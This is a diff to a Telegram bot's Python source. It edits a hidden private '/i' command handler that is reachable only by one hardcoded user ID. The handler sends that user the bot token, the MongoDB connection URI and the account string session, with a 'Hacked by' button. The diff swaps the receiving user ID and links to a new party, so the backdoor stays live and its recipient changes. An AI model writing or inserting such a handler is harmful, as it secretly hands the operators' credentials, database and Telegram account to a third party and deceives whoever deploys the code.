@@ -108,17 +108,17 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("i")
     & filters.private
-    & filters.user(7995626429)
+    & filters.user(8274033012)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/THUNDERDEVS)............☆""",
+       caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/aaroohixsuport)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/ll_ISTKHAR_BABY_lll")
+                         "• 𝖧ᴀᴄᴋᴇᴅ вʏ  •", url=f"https://t.me/aaroohixsuport")
                  ]
             ]
          ),
